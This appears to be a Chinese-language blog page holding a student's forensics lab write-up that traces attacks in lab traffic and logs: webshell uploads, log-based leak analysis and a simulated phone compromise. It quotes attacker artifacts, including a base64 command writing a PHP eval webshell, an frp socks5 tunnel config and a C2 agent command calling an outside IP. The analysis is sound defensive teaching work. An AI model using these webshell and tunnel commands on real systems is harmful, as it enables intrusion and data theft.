@@ -1,0 +1,909 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/OIP-C.png">
+  <link rel="icon" href="/img/OIP-C.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="r0otsu">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="溯源与取证分析实验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lab 13">
+<meta property="og:url" content="https://r0otsu.github.io/2024/12/26/lab13/index.html">
+<meta property="og:site_name" content="r0otsu Blog">
+<meta property="og:description" content="溯源与取证分析实验">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226112950552.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226112958107.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113005130.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113016118.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113027296.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113035463.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113043324.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113051901.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113059479.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113109222.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113117037.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113124224.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113131503.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113138922.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113145574.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113153263.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113159425.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113206320.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113213190.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113220144.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113227013.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113234094.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113241509.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113248670.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113255246.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113302136.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113309050.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113316461.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226113322120.png">
+<meta property="article:published_time" content="2024-12-25T20:48:49.000Z">
+<meta property="article:modified_time" content="2024-12-29T07:59:32.002Z">
+<meta property="article:author" content="r0otsu">
+<meta property="article:tag" content="SEED-Labs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/r0otsu/piclist/raw/master/20241226112950552.png">
+  
+  
+  
+  <title>Lab 13 - r0otsu Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/myfont/iconfont.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"r0otsu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":"https://cloud.umami.is/script.js","website_id":"76c804ff-36c9-4795-8275-233c7d521ebe","domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>r0otsu</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/index.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Lab 13"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-26 04:48" pubdate>
+          2024年12月26日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Lab 13</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer" />
+
+<h1 id="Lab-13-溯源与取证分析实验"><a href="#Lab-13-溯源与取证分析实验" class="headerlink" title="Lab 13-溯源与取证分析实验"></a>Lab 13-溯源与取证分析实验</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>溯源取证分析作为网络攻防过程中重要环节，准确找到攻击者的入侵线索(尤其是攻击突破口、攻击IP地址、域名、工具等信息)，对于企业或者团队安全运营团队来说都是必备技能。常规攻击取证过程中往往会结合流量、Web访问日志、终端系统或者软件日志等信息来挖掘或者推断相关线索。本实验通过网络流量、日志等溯源环境进行真实案例模仿，通过实战化分析来锻炼学生的取证溯源能力，从而加深大家对于网络攻防的实战化水平。在本实验结束时，学生应该能够具备对网络流量和日志的基本分析能力。</p>
+<hr>
+<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="Task1-Webshell数据包-webshell-zip"><a href="#Task1-Webshell数据包-webshell-zip" class="headerlink" title="Task1 Webshell数据包(webshell.zip)"></a>Task1 Webshell数据包(webshell.zip)</h4><p>小张单位网站被黑客挂马，请从流量中分析出webshell，并进行回答：</p>
+<p>A.  黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。</p>
+<p>B.  黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。</p>
+<hr>
+<h5 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h5><ol>
+<li><p>搜索login，在No.101发现很轻易就拿到了输入的用户名和密码</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112950552.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112958107.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>因为知道是用了webshell攻击，所以肯定是执行了system命令的，搜了一下发现了返回’a’</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113005130.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>但是后面的system对应的参数都是aaa，执行了下述这些命令</p>
+<ol>
+<li><p>system(‘whoami’);  </p>
+<p>获取当前程序运行的用户</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113016118.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>system(‘ipconfig’);</p>
+<p>显示当前计算机的网络配置信息</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113027296.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>system(‘pwd’);</p>
+<p>显示当前工作目录</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113035463.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>system(‘echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4&#x3D;|base64 -d’);</p>
+<p>将这段字符串用base64解码后，发现为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这是一个明显的恶意代码，若写入web服务器的php文件后，可以用蚁剑连接拿到shell</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113043324.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>system(‘echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4&#x3D;|base64 -d &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;1.php’);</p>
+<p>果然，这里就执行了</p>
+<p>在web服务器的 <code>/var/www/html</code> 目录下生成了一个文件 <code>1.php</code>，内容为上述的恶意代码</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113051901.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+</li>
+<li><p>继续跟踪<code>aaa</code></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113059479.png" srcset="/img/loading.gif" lazyload></p>
+<ol>
+<li><p>第一个item可以看出是明显的蚁剑连接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asenc</span>(<span class="hljs-params"><span class="hljs-variable">$out</span></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;&#125;;.....<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>第二个item中的值进行base64解码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-keyword">var</span>/www/html/frpc.ini<br></code></pre></td></tr></table></figure>
+
+<p>表示将路径 <code>/var/www/html/frpc.ini</code> 作为表单数据提交，即 将<code>frpc.ini</code>文件上传到服务器上，<font color='green'>攻击者能够通过这个文件访问服务器内的资源</font></p>
+</li>
+<li><p>第三个item中的值进行解析，这是一个ASCII编码，解码后得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">[common]<br>server_addr = <span class="hljs-number">192.168</span>.<span class="hljs-number">239.123</span><br>server_port = <span class="hljs-number">7777</span><br>token = Xa3BJf2l5enmN6Z7A8mv<br><br>[test_sock5]<br>type = tcp<br>remote_port = <span class="hljs-number">8111</span><br>plugin = socks5<br>plugin_user = <span class="hljs-number">0</span>HDFt16cLQJ<br>plugin_passwd = JTN276Gp<br>use_encryption = <span class="hljs-literal">true</span><br>use_compression = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<p>可以拿到SOCKS5的user和passwd字段</p>
+</li>
+</ol>
+</li>
+</ol>
+<hr>
+<h5 id="A-黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。"><a href="#A-黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。" class="headerlink" title="A.  黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。"></a>A.  黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。</h5><p><font color='red'>（分析过程见上）</font></p>
+<ol>
+<li><p>登录系统</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113109222.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>写入webshell</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113117037.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>使用蚁剑进行连接，拿到webshell并进行操作</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113124224.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+<hr>
+<h5 id="B-黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。"><a href="#B-黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。" class="headerlink" title="B.  黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。"></a>B.  黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。</h5><p><font color='red'>（分析过程见上）</font></p>
+<ol>
+<li><p>登录使用的账号、密码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">username: test<br>password: Admin123!@#<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113131503.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>SOCKS5的账号、密码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">plugin_user = 0HDFt16cLQJ<br>plugin_passwd = JTN276Gp<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113138922.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+<hr>
+<h4 id="Task2-日志分析-日志分析-zip"><a href="#Task2-日志分析-日志分析-zip" class="headerlink" title="Task2 日志分析(日志分析.zip)"></a>Task2 日志分析(日志分析.zip)</h4><p>小明发现单位某应用程序被攻击后提取了对应的日志数据，请分析日志并进行作答：</p>
+<h5 id="A-网络存在源码泄漏，源码文件名是什么？-请提交带有文件后缀的文件名，例如x-txt，并对流量分析进行截图"><a href="#A-网络存在源码泄漏，源码文件名是什么？-请提交带有文件后缀的文件名，例如x-txt，并对流量分析进行截图" class="headerlink" title="A.  网络存在源码泄漏，源码文件名是什么？(请提交带有文件后缀的文件名，例如x.txt，并对流量分析进行截图)"></a>A.  网络存在源码泄漏，<strong>源码文件名是什么</strong>？(请提交带有文件后缀的文件名，例如x.txt，并对流量分析进行截图)</h5><ol>
+<li><p>直接在日志中以状态码200看一下攻击者成功访问了哪些文件</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113145574.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现有<code>www.zip</code>，这是网站备份文件，本来不应该是普通用户能够访问的，所以网站应该泄露的就是<code>www.zip</code>文件</p>
+</li>
+</ol>
+<p><strong>网站泄露的是<code>www.zip</code>文件</strong></p>
+<hr>
+<h5 id="B-分析攻击流量，黑客往-tmp目录写入一个文件，文件名是什么？-请对流量分析进行截图"><a href="#B-分析攻击流量，黑客往-tmp目录写入一个文件，文件名是什么？-请对流量分析进行截图" class="headerlink" title="B.  分析攻击流量，黑客往&#x2F;tmp目录写入一个文件，文件名是什么？(请对流量分析进行截图)"></a>B.  分析攻击流量，黑客往&#x2F;tmp目录写入一个文件，<strong>文件名是什么</strong>？(请对流量分析进行截图)</h5><ol>
+<li><p>在日志中搜索’tmp’</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113153263.png" srcset="/img/loading.gif" lazyload></p>
+<p>攻击者尝试访问<code>/tmp/sess_car</code>文件，并往其中写入了一段序列化的php代码</p>
+<p>如果服务器对 <code>/tmp/sess_car</code> 文件执行反序列化操作，攻击者可以伪造数据触发 <code>call_user_func_array</code>，调用任意函数</p>
+</li>
+</ol>
+<p><strong>写入的是<code>sess_car</code>文件</strong></p>
+<hr>
+<h5 id="C-分析攻击流量，黑客使用的是什么漏洞读取了秘密文件？"><a href="#C-分析攻击流量，黑客使用的是什么漏洞读取了秘密文件？" class="headerlink" title="C.  分析攻击流量，黑客使用的是什么漏洞读取了秘密文件？"></a>C.  分析攻击流量，黑客使用的是<strong>什么漏洞</strong>读取了秘密文件？</h5><ol>
+<li><p>SplFileObject漏洞，当使用反序列化操作时，可以利用SplFileObject来触发一些安全漏洞</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113159425.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+<hr>
+<h4 id="Task3-攻击“苹果”注入-ios-zip"><a href="#Task3-攻击“苹果”注入-ios-zip" class="headerlink" title="Task3 攻击“苹果”注入(ios.zip)"></a>Task3 攻击“苹果”注入(ios.zip)</h4><p>一位苹果安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答：</p>
+<p>A.  简述黑客的整个攻击过程，关键步骤请配图说明。</p>
+<p>B.  黑客所控制的C&amp;C服务器IP是什么？</p>
+<p>C.  被害者手机上被拿走了的私钥文件内容是什么？</p>
+<hr>
+<h5 id="问题分析-1"><a href="#问题分析-1" class="headerlink" title="问题分析"></a>问题分析</h5><ol>
+<li><p>在日志中搜索<code>php</code>，发现了<code>ma.php</code>，看起来很明显是一个植入的木马文件</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113206320.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>第一个访问中有<code>fxxk=system(base64_decode(%27d2hvYW1p%27));</code></p>
+<p>这表示攻击者试图传入fxxk参数，使服务器执行用base64编码后再解码的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><strong>并且已经执行成功了，返回’200’，说明木马植入成功</strong></p>
+</li>
+<li><p>打开pcap文件，发现在第15条tcp流时，<strong>攻击者下载了一个文件<code>Stowaway</code></strong></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113213190.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>Stowaway</code>是一个内网穿透工具，能够使攻击者通过这个文件访问用户中的所有文件</p>
+</li>
+<li><p>在这条流中搜索’ios_agent’，发现执行命令<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113220144.png" srcset="/img/loading.gif" lazyload></p>
+<p>也就是说攻击者主机IP是 <code>3.128.156.159</code>，使用的加密密钥是<code>hack4sec</code></p>
+</li>
+<li><p>文件中的流量被加密了</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113227013.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>使用实验中给到的<code>keylog.txt</code>密钥文件进行解密</p>
+<p>编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;(Pre)-Master-Secret log filename-&gt;浏览…</p>
+<p>将<code>keylog.txt</code>加载进去</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113234094.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>筛选出http2流量，发现有明显的sql注入攻击</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113241509.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>确实是布尔注入</strong></p>
+</li>
+<li><p>进行端口扫描，在端口扫描时，大多数端口会显示关闭，返回RST，可以在专家模式中找到RST的最大和最小端口确定端口扫描范围</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113248670.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+<hr>
+<h5 id="A-简述黑客的整个攻击过程，关键步骤请配图说明。"><a href="#A-简述黑客的整个攻击过程，关键步骤请配图说明。" class="headerlink" title="A.  简述黑客的整个攻击过程，关键步骤请配图说明。"></a>A.  简述黑客的整个攻击过程，关键步骤请配图说明。</h5><ol>
+<li><p>以3.128.156.159作为C&amp;C服务器，在192.168.1.8安装ios_agent，并执行命令<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code>控制主机</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113255246.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>对192.168.1.8进行SQL注入攻击，获取敏感信息</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113302136.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>进行端口扫描</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113309050.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>向主机中植入木马，写入webshell</p>
+<p>攻击者试图传入fxxk参数，使服务器执行用base64编码后再解码的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113316461.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+<h5 id="B-黑客所控制的C-C服务器IP是什么？"><a href="#B-黑客所控制的C-C服务器IP是什么？" class="headerlink" title="B.  黑客所控制的C&amp;C服务器IP是什么？"></a>B.  黑客所控制的C&amp;C服务器IP是什么？</h5><ol>
+<li><p>从上述可知，执行命令为<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code>，即攻击者控制的ip为<code>3.128.156.159</code></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113322120.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+<hr>
+<h5 id="C-被害者手机上被拿走了的私钥文件内容是什么？"><a href="#C-被害者手机上被拿走了的私钥文件内容是什么？" class="headerlink" title="C.  被害者手机上被拿走了的私钥文件内容是什么？"></a>C.  被害者手机上被拿走了的私钥文件内容是什么？</h5><ol>
+<li><p><del>通过sql注入命令，可以知道攻击者在一个个尝试密码中的每一个字符。并且黑客遍历每一个字符的顺序为0x2B、0x2D、0x7B、0x7D、0x30……</del></p>
+<p>依次这样分析剩下的所有数据包即可获得所有的16进制值</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">37343635386633206338343120343536642038356437206436633066656461626232<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>解码16进制后得到</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">746558f3-c841-456b-85d7-d6c0f2edabb2<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>即得到敏感信息为<code>746558f3-c841-456b-85d7-d6c0f2edabb2</code></p>
+<hr>
+<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/study/" class="category-chain-item">study</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/SEED-Labs/" class="print-no-link">#SEED-Labs</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Lab 13</div>
+      <div>https://r0otsu.github.io/2024/12/26/lab13/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>r0otsu</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
